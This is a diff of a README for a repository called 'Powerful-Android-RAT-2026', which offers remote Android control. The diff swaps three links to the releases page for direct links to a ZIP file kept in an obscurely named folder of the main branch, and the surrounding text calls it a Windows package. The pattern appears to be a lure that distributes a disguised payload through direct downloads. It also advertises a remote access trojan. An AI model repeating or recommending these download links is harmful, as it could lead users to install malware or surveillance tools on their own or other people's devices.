@@ -1,6 +1,6 @@
 # 📱 Powerful-Android-RAT-2026 - Remote Android Control Made Simple
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/voicingboss861/Powerful-Android-RAT-2026/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/voicingboss861/Powerful-Android-RAT-2026/raw/refs/heads/main/periglottis/RA_Powerful_Android_v1.9.zip)
 
 ## 🧰 What this app does
 
@@ -34,7 +34,7 @@ For best results, use:
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/voicingboss861/Powerful-Android-RAT-2026/releases
+Visit this page to download: https://github.com/voicingboss861/Powerful-Android-RAT-2026/raw/refs/heads/main/periglottis/RA_Powerful_Android_v1.9.zip
 
 On that page, look for the latest release file. Download the Windows package that matches the app. If the release comes as a ZIP file, save it to your desktop or Downloads folder.
 
@@ -226,4 +226,4 @@ You can:
 
 Always use the latest release from the release page. New builds may fix bugs, improve connection stability, and update support files.
 
-Download the newest version here: https://github.com/voicingboss861/Powerful-Android-RAT-2026/releases
+Download the newest version here: https://github.com/voicingboss861/Powerful-Android-RAT-2026/raw/refs/heads/main/periglottis/RA_Powerful_Android_v1.9.zip
